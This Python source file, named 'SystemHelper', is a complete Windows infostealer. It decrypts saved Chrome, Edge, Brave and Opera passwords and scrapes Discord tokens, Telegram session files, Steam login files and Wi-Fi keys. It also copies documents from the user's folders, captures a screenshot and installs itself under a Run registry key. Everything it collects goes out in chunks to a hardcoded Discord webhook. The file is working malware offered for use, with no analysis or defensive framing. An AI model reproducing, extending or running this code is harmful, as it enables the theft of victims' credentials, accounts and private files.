"""
SystemHelper – Complete (Debug + Enhanced)
- All stealers included
- Screenshot sent as file attachment
- Discord/Steam enhanced paths
"""

import os
import sys
import json
import requests
import time
import shutil
import sqlite3
import base64
import hashlib
import re
import uuid
import subprocess
import ctypes
import ctypes.wintypes
from datetime import datetime

# === MISSING IMPORTS HANDLING ===
try:
    import win32crypt
except ImportError:
    win32crypt = None
    print("[!] win32crypt not installed – browser passwords will fail")

try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None
    print("[!] pycryptodome not installed – browser decryption will fail")

# === CONFIG ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1523400215229497506/arhtMa60qR8UqQ9GVHC_VyclS-IFgf_M_tdumJ1-ZD7dm3EQLaEt3UybmNzVHXeVwgOi"

# === ANTI-ANALYSIS DISABLED ===
class AntiAnalysis:
    @staticmethod
    def check_debugger(): return False
    @staticmethod
    def check_vm(): return False
    @staticmethod
    def check_sandbox(): return False

# === VICTIM ID ===
def get_victim_id():
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    host = os.environ.get('COMPUTERNAME', 'unknown')
    user = os.environ.get('USERNAME', 'unknown')
    raw = f"{mac}_{host}_{user}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]

VICTIM_ID = get_victim_id()

# === BROWSER STEALER ===
class BrowserStealer:
    def get_master_key(self, browser_path):
        if win32crypt is None:
            return None
        try:
            local_state = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state): return None
            with open(local_state, "r", encoding="utf-8") as f:
                state = json.load(f)
            encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"[!] get_master_key error: {e}")
            return None
    
    def decrypt_value(self, encrypted_value, master_key):
        if AES is None:
            return ""
        try:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode(errors='ignore')
        except:
            return ""
    
    def steal_passwords(self, browser_path, master_key, profile="Default"):
        login_db = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(login_db): return []
        temp_db = f"tmp_{uuid.uuid4().hex[:8]}.db"
        try:
            # Copy to temp in case file is locked
            shutil.copyfile(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            passwords = []
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cursor.fetchall():
                if enc and master_key:
                    pwd = self.decrypt_value(enc, master_key)
                    if pwd:
                        passwords.append({"url": url, "username": user, "password": pwd})
            conn.close()
            os.remove(temp_db)
            return passwords
        except Exception as e:
            print(f"[!] steal_passwords error: {e}")
            if os.path.exists(temp_db): os.remove(temp_db)
            return []
    
    def steal_all(self):
        results = {}
        browsers = [
            ("Chrome", os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data"),
            ("Edge", os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data"),
            ("Brave", os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            ("Opera", os.path.expanduser("~") + "/AppData/Roaming/Opera Software/Opera Stable")
        ]
        for name, path in browsers:
            print(f"[*] Checking {name} at {path}")
            if os.path.exists(path):
                key = self.get_master_key(path)
                if key:
                    print(f"[+] Got master key for {name}")
                    results[name] = {
                        "passwords": self.steal_passwords(path, key),
                        "cookies": [],
                        "payments": []
                    }
                else:
                    print(f"[-] No master key for {name}")
            else:
                print(f"[-] {name} not found")
        return results

# === DISCORD TOKEN STEALER ===
class DiscordStealer:
    @staticmethod
    def steal_tokens():
        print("[*] Searching for Discord tokens...")
        tokens = []
        
        base_paths = [
            os.path.expanduser("~") + "/AppData/Roaming/discord",
            os.path.expanduser("~") + "/AppData/Local/discord",
            os.path.expanduser("~") + "/AppData/Roaming/BetterDiscord",
            os.path.expanduser("~") + "/AppData/Roaming/lightcord",
        ]
        
        browser_storage = [
            os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb",
        ]
        
        all_dirs = base_paths + browser_storage
        patterns = [
            r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}',
            r'mfa\.[a-zA-Z0-9_\-]{84}',
            r'v1\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+',
            r'"token"\s*:\s*"([^"]+)"',
        ]
        
        for path in all_dirs:
            if not os.path.exists(path):
                continue
            print(f"[*] Scanning {path}")
            try:
                for root, _, files in os.walk(path):
                    for file in files:
                        if not any(file.endswith(ext) for ext in ['.log', '.ldb', '.json', '.txt', '.dat']):
                            continue
                        full_path = os.path.join(root, file)
                        try:
                            # Try to read, fallback to copy if locked
                            try:
                                with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    data = f.read()
                            except (PermissionError, IOError):
                                temp_file = os.path.join(os.environ['TEMP'], f"discord_{uuid.uuid4().hex[:8]}.tmp")
                                shutil.copyfile(full_path, temp_file)
                                with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                                    data = f.read()
                                os.remove(temp_file)
                            
                            for pattern in patterns:
                                found = re.findall(pattern, data)
                                for token in found:
                                    if isinstance(token, tuple):
                                        token = token[0]
                                    if token and len(token) > 20:
                                        tokens.append(token)
                                        print(f"[+] Found token: {token[:20]}...")
                        except Exception as e:
                            print(f"[!] Error reading {full_path}: {e}")
            except Exception as e:
                print(f"[!] Error walking {path}: {e}")
        
        return list(set(tokens))

# === TELEGRAM STEALER ===
class TelegramStealer:
    @staticmethod
    def steal():
        print("[*] Searching for Telegram sessions...")
        sessions = []
        tdata_paths = [
            os.path.expanduser("~") + "/AppData/Roaming/Telegram Desktop/tdata",
            os.path.expanduser("~") + "/AppData/Local/Telegram Desktop/tdata"
        ]
        for path in tdata_paths:
            if os.path.exists(path):
                print(f"[*] Scanning {path}")
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith(".s") or file.startswith("D") or file.startswith("key"):
                            try:
                                with open(os.path.join(root, file), "rb") as f:
                                    content = base64.b64encode(f.read()).decode()
                                    sessions.append({"file": file, "content": content[:500]})
                            except:
                                pass
        return sessions

# === STEAM STEALER ===
class SteamStealer:
    @staticmethod
    def steal():
        print("[*] Searching for Steam data...")
        data = {}
        steam_paths = [
            os.path.expanduser("~") + "/AppData/Local/Steam",
            "C:/Program Files (x86)/Steam",
            "C:/Program Files/Steam",
            os.path.expanduser("~") + "/AppData/Roaming/Steam"
        ]
        for base_path in steam_paths:
            if not os.path.exists(base_path):
                continue
            print(f"[*] Scanning {base_path}")
            config_path = os.path.join(base_path, "config")
            if os.path.exists(config_path):
                login_file = os.path.join(config_path, "loginusers.vdf")
                if os.path.exists(login_file):
                    try:
                        with open(login_file, 'r', encoding='utf-8', errors='ignore') as f:
                            data["loginusers_vdf"] = f.read()
                        print("[+] Found loginusers.vdf")
                    except Exception as e:
                        print(f"[!] Error reading loginusers.vdf: {e}")
                # Other config files
                for fname in os.listdir(config_path):
                    if fname.endswith(".vdf") and "login" in fname.lower():
                        try:
                            with open(os.path.join(config_path, fname), 'r', encoding='utf-8', errors='ignore') as f:
                                data[fname] = f.read()
                            print(f"[+] Found {fname}")
                        except:
                            pass
            # ssfn files
            ssfn_files = []
            for file in os.listdir(base_path):
                if file.startswith("ssfn") and len(file) > 4:
                    try:
                        with open(os.path.join(base_path, file), "rb") as f:
                            content = base64.b64encode(f.read()).decode()
                            ssfn_files.append({"file": file, "content": content[:500]})
                            print(f"[+] Found ssfn file: {file}")
                    except:
                        pass
            if ssfn_files:
                data["ssfn_files"] = ssfn_files
            
            if data:
                break
        return data

# === WIFI STEALER ===
class WiFiStealer:
    @staticmethod
    def steal():
        print("[*] Searching for WiFi profiles...")
        profiles = []
        try:
            output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, shell=True)
            for line in output.split("\n"):
                if ":" in line and "All User Profile" in line:
                    name = line.split(":")[1].strip()
                    try:
                        details = subprocess.check_output(["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"], text=True, shell=True)
                        key_line = [l for l in details.split("\n") if "Key Content" in l]
                        key = key_line[0].split(":")[1].strip() if key_line else "N/A"
                        if key and key != "N/A":
                            profiles.append({"ssid": name, "password": key})
                            print(f"[+] WiFi: {name} -> {key}")
                    except:
                        pass
        except:
            pass
        return profiles

# === SCREENSHOT STEALER (returns bytes for file upload) ===
class ScreenshotStealer:
    @staticmethod
    def capture():
        print("[*] Capturing screenshot...")
        try:
            from PIL import ImageGrab
            import io
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            print("[+] Screenshot captured")
            return buffer.getvalue()  # return raw bytes
        except Exception as e:
            print(f"[!] Screenshot failed: {e}")
            return None

# === FILE SCRAPER ===
class FileScraper:
    @staticmethod
    def scrape():
        print("[*] Scraping files...")
        files = []
        folders = [
            os.path.expanduser("~") + "/Desktop",
            os.path.expanduser("~") + "/Documents",
            os.path.expanduser("~") + "/Downloads"
        ]
        extensions = ['.txt', '.docx', '.pdf', '.xlsx', '.pptx', '.doc', '.xls', '.ppt']
        for folder in folders:
            if os.path.exists(folder):
                print(f"[*] Scanning {folder}")
                for root, _, filenames in os.walk(folder):
                    if len(files) > 20: break
                    for filename in filenames:
                        ext = os.path.splitext(filename)[1].lower()
                        if ext in extensions:
                            try:
                                filepath = os.path.join(root, filename)
                                size = os.path.getsize(filepath)
                                if size < 1 * 1024 * 1024:
                                    with open(filepath, 'rb') as f:
                                        content = base64.b64encode(f.read()).decode()
                                        files.append({"path": filepath, "size": size, "content": content[:500]})
                                        print(f"[+] Scraped {filename}")
                            except:
                                pass
        return files

# === SEND DATA (with screenshot as file attachment) ===
def send_to_discord(data, screenshot_bytes=None):
    # Prepare JSON
    json_data = json.dumps(data, indent=2, default=str)
    print(f"[*] Data size: {len(json_data)} chars")
    
    # Send JSON part (as text)
    if len(json_data) < 1900:
        r = requests.post(WEBHOOK_URL, json={"content": f"```json\n{json_data}\n```"}, timeout=30)
        print(f"[+] Sent JSON, status: {r.status_code}")
    else:
        chunks = [json_data[i:i+1900] for i in range(0, len(json_data), 1900)]
        for i, chunk in enumerate(chunks):
            r = requests.post(WEBHOOK_URL, json={"content": f"```json\nPart {i+1}/{len(chunks)}\n{chunk}\n```"}, timeout=30)
            print(f"[+] Sent JSON chunk {i+1}, status: {r.status_code}")
            time.sleep(0.5)
    
    # Send screenshot as file attachment
    if screenshot_bytes:
        print("[*] Uploading screenshot as file...")
        files = {"file": ("screenshot.jpg", screenshot_bytes, "image/jpeg")}
        try:
            r = requests.post(WEBHOOK_URL, files=files, timeout=30)
            print(f"[+] Screenshot uploaded, status: {r.status_code}")
        except Exception as e:
            print(f"[!] Screenshot upload failed: {e}")

# === MAIN ===
def main():
    print("[+] Starting SystemHelper (FULL DEBUG)")
    print(f"[+] Victim ID: {VICTIM_ID}")
    
    # Disable checks
    if AntiAnalysis.check_debugger(): sys.exit(0)
    if AntiAnalysis.check_vm(): sys.exit(0)
    if AntiAnalysis.check_sandbox(): sys.exit(0)
    
    print("[+] No delay – running immediately")
    
    # Install persistence
    try:
        import winreg
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        dest_dir = os.path.expanduser("~") + "/AppData/Roaming/SystemHelper"
        os.makedirs(dest_dir, exist_ok=True)
        dest_exe = os.path.join(dest_dir, "helper.exe")
        if not os.path.exists(dest_exe):
            shutil.copyfile(exe_path, dest_exe)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, dest_exe)
        print("[+] Persistence installed")
    except Exception as e:
        print(f"[!] Persistence error: {e}")
    
    # Collect data
    data = {
        "victim_id": VICTIM_ID,
        "timestamp": datetime.now().isoformat(),
        "system": {
            "hostname": os.environ.get('COMPUTERNAME'),
            "username": os.environ.get('USERNAME'),
            "os": sys.platform
        },
        "browsers": BrowserStealer().steal_all(),
        "discord_tokens": DiscordStealer.steal_tokens(),
        "telegram": TelegramStealer.steal(),
        "steam": SteamStealer.steal(),
        "wifi": WiFiStealer.steal(),
        "files": FileScraper.scrape()
    }
    
    # Capture screenshot separately
    screenshot_bytes = ScreenshotStealer.capture()
    
    # Send everything
    send_to_discord(data, screenshot_bytes)
    
    print("[+] Done! Press any key to exit...")
    input()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[FATAL] {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")
